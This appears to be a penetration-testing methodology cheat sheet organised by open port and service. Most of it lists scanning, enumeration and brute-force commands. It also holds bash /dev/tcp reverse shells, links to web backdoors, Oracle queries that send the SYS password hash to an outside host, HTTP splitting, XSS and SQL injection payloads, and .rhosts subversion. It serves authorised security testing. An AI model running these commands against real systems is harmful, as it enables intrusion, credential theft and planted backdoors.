Penetration
===========

Penetration testing methodology
-------------------------------

http://www.0daysecurity.com/penetration-testing/penetration.html


* Discovery & Probing
* Enumeration
* Network Footprinting
* Password Cracking
* Voip Security
* Vulnerability Assesment
* Wireless Penetration
* General Penetration



Discovery & Probing

    Discovery & Probing. Enumeration can serve two distinct purposes in an assessment: OS Fingerprinting Remote applications being served. OS fingerprinting or TCP/IP stack fingerprinting is the process of determining the operating system being utilised on a remote host. This is carried out by analyzing packets received from the host in question. There are two distinct ways to OS fingerprint, actively (i.e. nmap) or passively (i.e. scanrand). Passive OS fingerprinting determines the remote OS utilising the packets received only and does not require any packets to be sent. Active OS fingerprinting is very noisy and requires packets to be sent to the remote host and waits for a reply, (or lack thereof). Disparate OS's respond differently to certain types of packet, (the response is governed by an RFC and any proprietary responses the vendor (notably Microsoft) has enabled within the system) and so custom packets may be sent. Remote applications being served on a host can be determined by an open port on that host. By port scanning it is then possible to build up a picture of what applications are running and tailor the test accordingly.
        Default Port Lists
            Windows
            *nix
        Enumeration tools and techniques - The vast majority can be used generically, however, certain bespoke application require there own specific toolsets to be used. Default passwords are platform and vendor specific
            General Enumeration Tools
                nmap
                    nmap -n -A -PN -p- -T Agressive -iL nmap.targetlist -oX nmap.syn.results.xml
                    nmap -sU -PN -v -O -p 1-30000 -T polite -iL nmap.targetlist > nmap.udp.results
                    nmap -sV -PN -v -p 21,22,23,25,53,80,443,161 -iL nmap.targets > nmap.version.results
                    nmap -A -sS -PN -n --script:all ip_address --reason
                    grep "appears to be up" nmap_saved_filename | awk -F\( '{print $2}' | awk -F\) '{print $1}' > ip_list
                netcat
                    nc -v -n IP_Address port
                    nc -v -w 2 -z IP_Address port_range/port_number
                amap
                    amap -bqv 192.168.1.1 80
                    amap [-A|-B|-P|-W] [-1buSRHUdqv] [[-m] -o <file>] [-D <file>] [-t/-T sec] [-c cons] [-C retries] [-p proto] [-i <file>] [target port [port] ...]
                xprobe2
                    xprobe2 192.168.1.1
                sinfp
                    ./sinfp.pl -i -p
                nbtscan
                    nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename) | (<scan_range>)
                hping
                    hping ip_address
                scanrand
                    scanrand ip_address:all
                unicornscan
                    unicornscan [options `b:B:d:De:EFhi:L:m:M:pP:q:r:R:s:St:T:w:W:vVZ:' ] IP_ADDRESS/ CIDR_NET_MASK: S-E
                netenum
                    netenum network/netmask timeout
                fping fping -a -d hostname/ (Network/Subnet_Mask)
            Firewall Specific Tools
                firewalk
                    firewalk -p [protocol] -d [destination_port] -s [source_port] [internal_IP] [gateway_IP]
                ftester
                    host 1 ./ftestd -i eth0 -v host 2 ./ftest -f ftest.conf -v -d 0.01 then ./freport ftest.log ftestd.log
        Active Hosts
            Open TCP Ports
            Closed TCP Ports
            Open UDP Ports
            Closed UDP Ports
            Service Probing
                SMTP Mail Bouncing
                Banner Grabbing
                    Other
                    HTTP
                        Commands
                            JUNK / HTTP/1.0
                            HEAD / HTTP/9.3
                            OPTIONS / HTTP/1.0
                            HEAD / HTTP/1.0
                        Extensions
                            WebDAV
                            ASP.NET
                            Frontpage
                            OWA
                            IIS ISAPI
                            PHP
                            OpenSSL
                    HTTPS
                        Use stunnel to encapsulate traffic.
                    SMTP
                    POP3
                    FTP
                        If banner altered, attempt anon logon and execute: 'quote help' and 'syst' commands.
            ICMP Responses
                Type 3 (Port Unreachable)
                Type 8 (Echo Request)
                Type 13 (Timestamp Request)
                Type 15 (Information Request)
                Type 17 (Subnet Address Mask Request)
                Responses from broadcast address
            Source Port Scans
                TCP/UDP 53 (DNS)
                TCP 20 (FTP Data)
                TCP 80 (HTTP)
                TCP/UDP 88 (Kerberos)
            Firewall Assessment
                Firewalk
                TCP/UDP/ICMP responses
            OS Fingerprint




Enumeration

    FTP port 21 open
        Fingerprint server
            telnet ip_address 21 (Banner grab)
            Run command ftp ip_address
            ftp@example.com
            Check for anonymous access
                ftp ip_addressUsername: anonymous OR anonPassword: any@email.com
        Password guessing
            Hydra brute force
            medusa
            Brutus
        Examine configuration files
            ftpusers
            ftp.conf
            proftpd.conf
        MiTM
            pasvagg.pl
    SSH port 22 open
        Fingerprint server
            telnet ip_address 22 (banner grab)
            scanssh
                scanssh -p -r -e excludes random(no.)/Network_ID/Subnet_Mask
        Password guessing
            ssh root@ip_address
            guess-who
                ./b -l username -h ip_address -p 22 -2 < password_file_location
            Hydra brute force
            brutessh
            Ruby SSH Bruteforcer
        Examine configuration files
            ssh_config
            sshd_config
            authorized_keys
            ssh_known_hosts
            .shosts
        SSH Client programs
            tunnelier
            winsshd
            putty
            winscp
    Telnet port 23 open
        Fingerprint server
            telnet ip_address
                Common Banner ListOS/BannerSolaris 8/SunOS 5.8Solaris 2.6/SunOS 5.6Solaris 2.4 or 2.5.1/Unix(r) System V Release 4.0 (hostname)SunOS 4.1.x/SunOS Unix (hostname)FreeBSD/FreeBSD/i386 (hostname) (ttyp1)NetBSD/NetBSD/i386 (hostname) (ttyp1)OpenBSD/OpenBSD/i386 (hostname) (ttyp1)Red Hat 8.0/Red Hat Linux release 8.0 (Psyche)Debian 3.0/Debian GNU/Linux 3.0 / hostnameSGI IRIX 6.x/IRIX (hostname)IBM AIX 4.1.x/AIX Version 4 (C) Copyrights by IBM and by others 1982, 1994.IBM AIX 4.2.x or 4.3.x/AIX Version 4 (C) Copyrights by IBM and by others 1982, 1996.Nokia IPSO/IPSO (hostname) (ttyp0)Cisco IOS/User Access VerificationLivingston ComOS/ComOS - Livingston PortMaster
            telnetfp
        Password Attack

            Common passwords
            Hydra brute force
            Brutus
            telnet -l "-froot" hostname (Solaris 10+)
        Examine configuration files
            /etc/inetd.conf
            /etc/xinetd.d/telnet
            /etc/xinetd.d/stelnet
    Sendmail Port 25 open
        Fingerprint server
            telnet ip_address 25 (banner grab)
        Mail Server Testing
            Enumerate users
                VRFY username (verifies if username exists - enumeration of accounts)
                EXPN username (verifies if username is valid - enumeration of accounts)
            Mail Spoof Test
                HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT
            Mail Relay Test

                HELO anything
                    Identical to/from - mail from: <nobody@domain> rcpt to: <nobody@domain>
                    Unknown domain - mail from: <user@unknown_domain>
                    Domain not present - mail from: <user@localhost>
                    Domain not supplied - mail from: <user>

                    Source address omission - mail from: <> rcpt to: <nobody@recipient_domain>
                    Use IP address of target server - mail from: <user@IP_Address> rcpt to: <nobody@recipient_domain>

                    Use double quotes - mail from: <user@domain> rcpt to: <"user@recipent-domain">

                    User IP address of the target server - mail from: <user@domain> rcpt to: <nobody@recipient_domain@[IP Address]>

                    Disparate formatting - mail from: <user@[IP Address]> rcpt to: <@domain:nobody@recipient-domain>

                    Disparate formatting2 - mail from: <user@[IP Address]> rcpt to: <recipient_domain!nobody@[IP Address]>
        Examine Configuration Files
            sendmail.cf
            submit.cf
    DNS port 53 open
        Fingerprint server/ service
            host
                host [-aCdlnrTwv ] [-c class ] [-N ndots ] [-R number ] [-t type ] [-W wait ] name [server ] -v verbose format -t (query type) Allows a user to specify a record type i.e. A, NS, or PTR. -a Same as –t ANY. -l Zone transfer (if allowed). -f Save to a specified filename.
            nslookup
                nslookup [ -option ... ] [ host-to-find | - [ server ]]
            dig
                dig [ @server ] [-b address ] [-c class ] [-f filename ] [-k filename ] [-p port# ] [-t type ] [-x addr ] [-y name:key ] [-4 ] [-6 ] [name ] [type ] [class ] [queryopt... ]
            whois-h Use the named host to resolve the query -a Use ARIN to resolve the query -r Use RIPE to resolve the query -p Use APNIC to resolve the query -Q Perform a quick lookup
        DNS Enumeration
            Bile Suite
                perl BiLE.pl [website] [project_name]
                perl BiLE-weigh.pl [website] [input file]
                perl vet-IPrange.pl [input file] [true domain file] [output file] <range>
                perl vet-mx.pl [input file] [true domain file] [output file]
                perl exp-tld.pl [input file] [output file]
                perl jarf-dnsbrute [domain_name] (brutelevel) [file_with_names]
                perl qtrace.pl [ip_address_file] [output_file]
                perl jarf-rev [subnetblock] [nameserver]
            txdns
                txdns -rt -t domain_name
                txdns -x 50 -bb domain_name
                txdns --verbose -fm wordlist.dic --server ip_address -rr SOA domain_name -h c: \hostlist.txt
        Examine Configuration Files
            host.conf
            resolv.conf
            named.conf
    TFTP port 69 open
        TFTP Enumeration
            tftp ip_address PUT local_file
            tftp ip_address GET conf.txt (or other files)
            Solarwinds TFTP server
            tftp – i <IP> GET /etc/passwd (old Solaris)
        TFTP Bruteforcing
            TFTP bruteforcer
            Cisco-Torch
    Finger Port 79 open
        User enumeration
            finger 'a b c d e f g h' @example.com
            finger admin@example.com
            finger user@example.com
            finger 0@example.com
            finger .@example.com
            finger **@example.com
            finger test@example.com
            finger @example.com
        Command execution
            finger "|/bin/id@example.com"
            finger "|/bin/ls -a /@example.com"
        Finger Bounce
            finger user@host@victim
            finger @internal@external
    Web Ports 80, 8080 etc. open
        Fingerprint server
            Telnet ip_address port
            Firefox plugins
                All
                    firecat
                Specific
                    add n edit cookies
                    asnumber
                    header spy
                    live http headers
                    shazou
                    web developer
        Crawl website
            lynx [options] startfile/URL Options include -traversal -crawl -dump -image_links -source
            httprint
            Metagoofil
                metagoofil.py -d [domain] -l [no. of] -f [type] -o results.html
        Web Directory enumeration
            Nikto
                nikto [-h target] [options]
            DirBuster
            Wikto
            Goolag Scanner
        Vulnerability Assessment
            Manual Tests
                Default Passwords
                Install Backdoors
                    ASP
                        http://packetstormsecurity.org/UNIX/penetration/aspxshell.aspx.txt
                    Assorted
                        http://michaeldaw.org/projects/web-backdoor-compilation/
                        http://open-labs.org/hacker_webkit02.tar.gz
                    Perl
                        http://home.arcor.de/mschierlm/test/pmsh.pl
                        http://pentestmonkey.net/tools/perl-reverse-shell/
                        http://freeworld.thc.org/download.php?t=r&f=rwwwshell-2.0.pl.gz
                    PHP
                        http://php.spb.ru/remview/
                        http://pentestmonkey.net/tools/php-reverse-shell/
                        http://pentestmonkey.net/tools/php-findsock-shell/
                    Python
                        http://matahari.sourceforge.net/
                    TCL
                        http://www.irmplc.com/download_pdf.php?src=Creating_Backdoors_in_Cisco_IOS_using_Tcl.pdf&force=yes
                    Bash Connect Back Shell
                        GnuCitizen
                            Atttack Box: nc -l -p Port -vvv

                            Victim: $ exec 5<>/dev/tcp/IP_Address/Port

                            Victim: $ cat <&5 | while read line; do $line 2>&5 >&5; done
                        Neohapsis
                            Atttack Box: nc -l -p Port -vvv

                            Victim: $ exec 0</dev/tcp/IP_Address/Port # First we copy our connection over stdin

                            Victim: $ exec 1>&0 # Next we copy stdin to stdout

                            Victim: $ exec 2>&0 # And finally stdin to stderr

                            Victim: $ exec /bin/sh 0</dev/tcp/IP_Address/Port 1>&0 2>&0
                Method Testing
                    nc IP_Adress Port
                        HEAD / HTTP/1.0
                        OPTIONS / HTTP/1.0
                        PROPFIND / HTTP/1.0
                        TRACE / HTTP/1.1
                        PUT http://Target_URL/FILE_NAME
                        POST http://Target_URL/FILE_NAME HTTP/1.x
                Upload Files
                    curl
                        curl -u <username:password> -T file_to_upload <Target_URL>
                        curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" <Target_URL>
                    put.pl
                        put.pl -h target -r /remote_file_name -f local_file_name
                    webdav
                        cadaver
                View Page Source
                    Hidden Values
                    Developer Remarks
                    Extraneous Code
                    Passwords!
                Input Validation Checks
                    NULL or null
                        Possible error messages returned.
                    ' , " , ; , <!
                        Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
                    – , = , + , "
                        Used to craft SQL Injection queries.
                    ‘ , &, ! , ¦ , < , >
                        Used to find command execution vulnerabilities.
                    "><script>alert(1)</script>
                        Basic Cross-Site Scripting Checks.
                    %0d%0a
                        Carriage Return (%0d) Line Feed (%0a)
                            HTTP Splitting

                                language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
                                    i.e. Content-Length= 0 HTTP/1.1 200 OK Content-Type=text/html Content-Length=47<html>blah</html>
                            Cache Poisoning

                                language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
                    %7f , %ff
                        byte-length overflows; maximum 7- and 8-bit values.
                    -1, other
                        Integer and underflow vulnerabilities.
                    %n , %x , %s
                        Testing for format string vulnerabilities.
                    ../
                        Directory Traversal Vulnerabilities.
                    % , _, *
                        Wildcard characters can sometimes present DoS issues or information disclosure.
                    Ax1024+
                        Overflow vulnerabilities.
                Automated table and column iteration
                    orderby.py
                        ./orderby.py www.site.com/index.php?id=
                    d3sqlfuzz.py
                        ./d3sqlfuzz.py www.site.com/index.php?id=-1+UNION+ALL+SELECT+1,COLUMN,3+FROM+TABLE--
            Vulnerability Scanners
                Acunetix
                Grendelscan
                NStealth
                Obiwan III
                w3af
            Specific Applications/ Server Tools
                Domino
                    dominoaudit
                        dominoaudit.pl [options] -h <IP>
                Joomla
                    cms_few
                        ./cms.py <site-name>
                    joomsq
                        ./joomsq.py <IP>
                    joomlascan

                        ./joomlascan.py <site> <options>  [options i.e. -p/-proxy <host:port> : Add proxy support -404 : Don't show 404 responses]
                    joomscan
                        ./joomscan.py -u "www.site.com/joomladir/" -o site.txt -p 127.0.0.1:80
                    jscan
                        jscan.pl -f hostname
                        (shell.txt required)
                aspaudit.pl
                    asp-audit.pl http://target/app/filename.aspx (options i.e. -bf)
                Vbulletin
                    vbscan.py
                        vbscan.py <host> <port> -v
                        vbscan.py -update
                ZyXel
                    zyxel-bf.sh
                    snmpwalk
                        snmpwalk -v2c -c public IP_Address 1.3.6.1.4.1.890.1.2.1.2
                    snmpget
                        snmpget -v2c -c public IP_Address 1.3.6.1.4.1.890.1.2.1.2.6.0
        Proxy Testing
            Burpsuite
            Crowbar
            Interceptor
            Paros
            Requester Raw
            Suru
            WebScarab
        Examine configuration files
            Generic
                Examine httpd.conf/ windows config files
            JBoss
                JMX Console http://<IP>:8080/jmxconcole/
                    War File
            Joomla
                configuration.php
                diagnostics.php
                joomla.inc.php
                config.inc.php
            Mambo
                configuration.php
                config.inc.php
            Wordpress
                setup-config.php
                wp-config.php
            ZyXel
                /WAN.html (contains PPPoE ISP password)
                /WLAN_General.html and /WLAN.html (contains WEP key)
                /rpDyDNS.html (contains DDNS credentials)
                /Firewall_DefPolicy.html (Firewall)
                /CF_Keyword.html (Content Filter)
                /RemMagWWW.html (Remote MGMT)
                /rpSysAdmin.html (System)
                /LAN_IP.html (LAN)
                /NAT_General.html (NAT)
                /ViewLog.html (Logs)
                /rpFWUpload.html (Tools)
                /DiagGeneral.html (Diagnostic)
                /RemMagSNMP.html (SNMP Passwords)
                /LAN_ClientList.html (Current DHCP Leases)
                Config Backups
                    /RestoreCfg.html
                    /BackupCfg.html
                    Note: - The above config files are not human readable and the following tool is required to breakout possible admin credentials and other important settings
                        ZyXEL Config Reader
        Examine web server logs
            c:\winnt\system32\Logfiles\W3SVC1
                awk -F " " '{print $3,$11} filename | sort | uniq
        References
            White Papers
                Cross Site Request Forgery: An Introduction to a Common Web Application Weakness
                Attacking Web Service Security: Message Oriented Madness, XML Worms and Web Service Security Sanity
                Blind Security Testing - An Evolutionary Approach
                Command Injection in XML Signatures and Encryption
                Input Validation Cheat Sheet
                SQL Injection Cheat Sheet
            Books
                Hacking Exposed Web 2.0
                Hacking Exposed Web Applications
                The Web Application Hacker's Handbook
        Exploit Frameworks
            Brute-force Tools
                Acunetix
            Metasploit
            w3af
    Portmapper port 111 open
        rpcdump.py
            rpcdump.py username:password@IP_Address port/protocol (i.e. 80/HTTP)
        rpcinfo
            rpcinfo [options] IP_Address
    NTP Port 123 open
        NTP Enumeration
            ntpdc -c monlist IP_ADDRESS
            ntpdc -c sysinfo IP_ADDRESS
            ntpq
                host
                hostname
                ntpversion
                readlist
                version
        Examine configuration files
            ntp.conf
    NetBIOS Ports 135-139,445 open
        NetBIOS enumeration
            Enum
                enum <-UMNSPGLdc> <-u username> <-p password> <-f dictfile> <hostname|ip>
            Null Session
                net use \\192.168.1.1\ipc$ "" /u:""
                    net view \\ip_address
                    Dumpsec
            Smbclient
                smbclient -L //server/share password options
            Superscan
                Enumeration tab.
            user2sid/sid2user
            Winfo
        NetBIOS brute force
            Hydra
            Brutus
            Cain & Abel
            getacct
            NAT (NetBIOS Auditing Tool)
        Examine Configuration Files
            Smb.conf
            lmhosts
    SNMP port 161 open
        Default Community Strings
            public
            private
            cisco
                cable-docsis
                ILMI
        MIB enumeration
            Windows NT
                .1.3.6.1.2.1.1.5 Hostnames
                .1.3.6.1.4.1.77.1.4.2 Domain Name
                .1.3.6.1.4.1.77.1.2.25 Usernames
                .1.3.6.1.4.1.77.1.2.3.1.1 Running Services
                .1.3.6.1.4.1.77.1.2.27 Share Information
            Solarwinds MIB walk
            Getif
            snmpwalk
                snmpwalk -v <Version> -c <Community string> <IP>
            Snscan
            Applications
                ZyXel
                    snmpget -v2c -c <Community String> <IP> 1.3.6.1.4.1.890.1.2.1.2.6.0
                    snmpwalk -v2c -c <Community String> <IP> 1.3.6.1.4.1.890.1.2.1.2
        SNMP Bruteforce
            onesixtyone
                onesixytone -c SNMP.wordlist <IP>
            cat
                ./cat -h <IP> -w SNMP.wordlist
            Solarwinds SNMP Brute Force
            ADMsnmp
        Examine SNMP Configuration files
            snmp.conf
            snmpd.conf
            snmp-config.xml
    LDAP Port 389 Open
        ldap enumeration
            ldapminer
                ldapminer -h ip_address -p port (not required if default) -d
            luma
                Gui based tool
            ldp
                Gui based tool
            openldap
                ldapsearch [-n] [-u] [-v] [-k] [-K] [-t] [-A] [-L[L[L]]] [-M[M]] [-d debuglevel] [-f file] [-D binddn] [-W] [-w passwd] [-y passwdfile] [-H ldapuri] [-h ldaphost] [-p ldapport] [-P 2|3] [-b searchbase] [-s base|one|sub] [-a never|always|search|find] [-l timelimit] [-z sizelimit] [-O security-properties] [-I] [-U authcid] [-R realm] [-x] [-X authzid] [-Y mech] [-Z[Z]] filter [attrs...]
                ldapadd [-c][-S file][-n][-v][-k][-K][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile][-h ldaphost][-p ldap-port][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x][-X authzid][-Y mech][-Z[Z]][-f file]
                ldapdelete [-n][-v][-k][-K][-c][-M[M]][-d debuglevel][-f file][-D binddn][-W][-w passwd][-y passwdfile][-H ldapuri][-h ldaphost][-P 2|3][-p ldapport][-O security-properties][-U authcid][-R realm][-x][-I][-Q] [-X authzid][-Y mech][-Z[Z]][dn]
                ldapmodify [-a][-c][-S file][-n][-v][-k][-K][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile][-H ldapuri][-h ldaphost][-p ldapport][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x][-X authzid][-Y mech][-Z[Z]][-f file]
                ldapmodrdn [-r][-n][-v][-k][-K][-c][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile] [-H ldapuri][-h ldaphost][-p ldapport][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x] [-X authzid][-Y mech][-Z[Z]][-f file][dn rdn]
        ldap brute force
            bf_ldap
                bf_ldap -s server -d domain name -u|-U username | users list file name -L|-l passwords list | length of passwords to generate optional: -p port (default 389) -v (verbose mode) -P Ldap user path (default ,CN=Users,)
            K0ldS
            LDAP_Brute.pl
        Examine Configuration Files
            General
                containers.ldif
                ldap.cfg
                ldap.conf
                ldap.xml
                ldap-config.xml
                ldap-realm.xml
                slapd.conf
            IBM SecureWay V3 server
                V3.sas.oc
            Microsoft Active Directory server
                msadClassesAttrs.ldif
            Netscape Directory Server 4
                nsslapd.sas_at.conf
                nsslapd.sas_oc.conf
            OpenLDAP directory server
                slapd.sas_at.conf
                slapd.sas_oc.conf
            Sun ONE Directory Server 5.1
                75sas.ldif
    PPTP/L2TP/VPN port 500/1723 open
        Enumeration
            ike-scan
            ike-probe
        Brute-Force
            ike-crack
        Reference Material
            PSK cracking paper
            SecurityFocus Infocus
            Scanning a VPN Implementation
    Modbus port 502 open
        modscan
    rlogin port 513 open
        Rlogin Enumeration
            Find the files
                find / -name .rhosts
                locate .rhosts
            Examine Files
                cat .rhosts
            Manual Login
                rlogin hostname -l username
                rlogin <IP>
            Subvert the files
                echo ++ > .rhosts
        Rlogin Brute force
            Hydra
    rsh port 514 open
        Rsh Enumeration
            rsh host [-l username] [-n] [-d] [-k realm] [-f | -F] [-x] [-PN | -PO] command
        Rsh Brute Force
            rsh-grind
            Hydra
            medusa
    SQL Server Port 1433 1434 open
        SQL Enumeration
            piggy
            SQLPing
                sqlping ip_address/hostname
            SQLPing2
            SQLPing3
            SQLpoke
            SQL Recon
            SQLver
        SQL Brute Force
            SQLPAT
                sqlbf -u hashes.txt -d dictionary.dic -r out.rep - Dictionary Attack
                sqlbf -u hashes.txt -c default.cm -r out.rep - Brute-Force Attack
            SQL Dict
            SQLAT
            Hydra
            SQLlhf
            ForceSQL
    Citrix port 1494 open
        Citrix Enumeration
            Default Domain
            Published Applications
                ./citrix-pa-scan {IP_address/file | - | random} [timeout]
                citrix-pa-proxy.pl IP_to_proxy_to [Local_IP]
        Citrix Brute Force
            bforce.js
            connect.js
            Citrix Brute-forcer
            Reference Material
                Hacking Citrix - the legitimate backdoor
                Hacking Citrix - the forceful way
    Oracle Port 1521 Open
        Oracle Enumeration
            oracsec
            Repscan
            Sidguess
            Scuba
            DNS/HTTP Enumeration
                SQL> SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE US ERNAME='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAM E='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL

                SQL> select utl_http.request('http://gladius:5500/'||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME='SYS')) from dual;
            WinSID
            Oracle default password list
            TNSVer
                tnsver host [port]
            TCP Scan
            Oracle TNSLSNR
                Will respond to: [ping] [version] [status] [service] [change_password] [help] [reload] [save_config] [set log_directory] [set display_mode] [set log_file] [show] [spawn] [stop]
            TNSCmd
                perl tnscmd.pl -h ip_address
                perl tnscmd.pl version -h ip_address
                perl tnscmd.pl status -h ip_address
                perl tnscmd.pl -h ip_address --cmdsize (40 - 200)
            LSNrCheck
            Oracle Security Check (needs credentials)
            OAT
                sh opwg.sh -s ip_address
                opwg.bat -s ip_address
                sh oquery.sh -s ip_address -u username -p password -d SID OR c:\oquery -s ip_address -u username -p password -d SID
            OScanner
                sh oscanner.sh -s ip_address
                oscanner.exe -s ip_address
                sh reportviewer.sh oscanner_saved_file.xml
                reportviewer.exe oscanner_saved_file.xml
            NGS Squirrel for Oracle
            Service Register
                Service-register.exe ip_address
            PLSQL Scanner 2008
        Oracle Brute Force
            OAK
                ora-getsid hostname port sid_dictionary_list
                ora-auth-alter-session host port sid username password sql
                ora-brutesid host port start
                ora-pwdbrute host port sid username password-file
                ora-userenum host port sid userlistfile
                ora-ver -e (-f -l -a) host port
            breakable (Targets Application Server Port)
                breakable.exe host url [port] [v]host ip_address of the Oracle Portal Serverurl PATH_INFO i.e. /pls/orassoport TCP port Oracle Portal Server is serving pages fromv verbose
            SQLInjector (Targets Application Server Port)
                sqlinjector -t ip_address -a database -f query.txt -p 80 -gc 200 -ec 500 -k NGS SOFTWARE -gt SQUIRREL
                sqlinjector.exe -t ip_address -p 7777 -a where -gc 200 -ec 404 -qf q.txt -f plsql.txt -s oracle
            Check Password
            orabf
                orabf [hash]:[username] [options]
            thc-orakel
                Cracker
                Client
                Crypto
            DBVisualisor
                Sql scripts from pentest.co.uk
                Manual sql input of previously reported vulnerabilties
        Oracle Reference Material
            Understanding SQL Injection
            SQL Injection walkthrough
            SQL Injection by example
            Advanced SQL Injection in Oracle databases
            Blind SQL Injection
            SQL Cheatsheets

                http://ha.ckers.org/sqlinjection

                http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/

                http://www.0x000000.com/?i=14

                http://pentestmonkey.net/
    NFS Port 2049 open
        NFS Enumeration
            showmount -e hostname/ip_address
            mount -t nfs ip_address:/directory_found_exported /local_mount_point
        NFS Brute Force
            Interact with NFS share and try to add/delete
            Exploit and Confuse Unix
        Examine Configuration Files
            /etc/exports
            /etc/lib/nfs/xtab
    Compaq/HP Insight Manager Port 2301,2381open
        HP Enumeration
            Authentication Method
                Host OS Authentication
                Default Authentication
                    Default Passwords
            Wikto
            Nstealth
        HP Bruteforce
            Hydra
            Acunetix
        Examine Configuration Files
            path.properties
            mx.log
            CLIClientConfig.cfg
            database.props
            pg_hba.conf
            jboss-service.xml
            .namazurc
    MySQL port 3306 open
        Enumeration
            nmap -A -n -p3306 <IP Address>
            nmap -A -n -PN --script:ALL -p3306 <IP Address>
            telnet IP_Address 3306
            use test; select * from test;
            To check for other DB's -- show databases
        Administration
            MySQL Network Scanner
            MySQL GUI Tools
            mysqlshow
            mysqlbinlog
        Manual Checks
            Default usernames and passwords
                username: root password:
                testing
                    mysql -h <Hostname> -u root
                    mysql -h <Hostname> -u root
                    mysql -h <Hostname> -u root@localhost
                    mysql -h <Hostname>
                    mysql -h <Hostname> -u ""@localhost
            Configuration Files
                Operating System
                    windows
                        config.ini
                        my.ini
                            windows\my.ini
                            winnt\my.ini
                        <InstDir>/mysql/data/
                    unix
                        my.cnf
                            /etc/my.cnf
                            /etc/mysql/my.cnf
                            /var/lib/mysql/my.cnf
                            ~/.my.cnf
                            /etc/my.cnf
                Command History
                    ~/.mysql.history
                Log Files
                    connections.log
                    update.log
                    common.log
                To run many sql commands at once -- mysql -u username -p < manycommands.sql
                MySQL data directory (Location specified in my.cnf)
                    Parent dir = data directory
                    mysql
                    test
                    information_schema (Key information in MySQL)
                        Complete table list -- select table_schema,table_name from tables;
                        Exact privileges -- select grantee, table_schema, privilege_type FROM schema_privileges;
                        File privileges -- select user,file_priv from mysql.user where user='root';
                        Version -- select version();
                        Load a specific file -- SELECT LOAD_FILE('FILENAME');
                SSL Check
                    mysql> show variables like 'have_openssl';
                        If there's no rows returned at all it means the the distro itself doesn't support SSL connections and probably needs to be recompiled. If its disabled it means that the service just wasn't started with ssl and can be easily fixed.
            Privilege Escalation
                Current Level of access
                    mysql>select user();
                    mysql>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
                Access passwords
                    mysql> use mysql
                    mysql> select user,password from user;
                Create a new user and grant him privileges
                    mysql>create user test identified by 'test';
                    mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
                Break into a shell
                    mysql> \! cat /etc/passwd
                    mysql> \! bash
        SQL injection
            mysql-miner.pl
                mysql-miner.pl http://target/ expected_string database
            http://www.imperva.com/resources/adc/sql_injection_signatures_evasion.html
            http://www.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/
        References.
            Design Weaknesses
                MySQL running as root
                Exposed publicly on Internet
            http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=mysql
            http://search.securityfocus.com/swsearch?sbm=%2F&metaname=alldoc&query=mysql&x=0&y=0
    RDesktop port 3389 open
        Rdesktop Enumeration
            Remote Desktop Connection
        Rdestop Bruteforce
            TSGrinder
                tsgrinder.exe -w dictionary_file -l leet -d workgroup -u administrator -b -n 2 IP_Address
            Tscrack
    Sybase Port 5000+ open
        Sybase Enumeration
            sybase-version ip_address from NGS
        Sybase Vulnerability Assessment
            Use DBVisualiser
                Sybase Security checksheet
                    Copy output into excel spreadsheet
                    Evaluate mis-configured parameters
                Manual sql input of previously reported vulnerabilties
                    Advanced SQL Injection in SQL Server
                    More Advanced SQL Injection
            NGS Squirrel for Sybase
    SIP Port 5060 open
        SIP Enumeration
            netcat
                nc IP_Address Port
            sipflanker
                python sipflanker.py 192.168.1-254
            Sipscan
            smap
                smap IP_Address/Subnet_Mask
                smap -o IP_Address/Subnet_Mask
                smap -l IP_Address
        SIP Packet Crafting etc.
            sipsak
                Tracing paths: - sipsak -T -s sip:usernaem@domain
                Options request:- sipsak -vv -s sip:username@domain
                Query registered bindings:- sipsak -I -C empty -a password -s sip:username@domain
            siprogue
        SIP Vulnerability Scanning/ Brute Force
            tftp bruteforcer
                Default dictionary file
                ./tftpbrute.pl IP_Address Dictionary_file Maximum_Processes
            VoIPaudit
            SiVuS
        Examine Configuration Files
            SIPDefault.cnf
            asterisk.conf
            sip.conf
            phone.conf
            sip_notify.conf
            <Ethernet address>.cfg
            000000000000.cfg
            phone1.cfg
            sip.cfg etc. etc.
    VNC port 5900^ open
        VNC Enumeration
            Scans
                5900^ for direct access.5800 for HTTP access.
        VNC Brute Force
            Password Attacks
                Remote
                    Password Guess
                        vncrack
                    Password Crack
                        vncrack
                        Packet Capture
                            Phosshttp://www.phenoelit.de/phoss
                Local
                    Registry Locations
                        \HKEY_CURRENT_USER\Software\ORL\WinVNC3
                        \HKEY_USERS\.DEFAULT\Software\ORL\WinVNC3
                    Decryption Key
                        0x238210763578887
        Exmine Configuration Files
            .vnc
            /etc/vnc/config
            $HOME/.vnc/config
            /etc/sysconfig/vncservers
            /etc/vnc.conf
    X11 port 6000^ open
        X11 Enumeration
            List open windows
            Authentication Method
                Xauth
                Xhost
        X11 Exploitation
            xwd
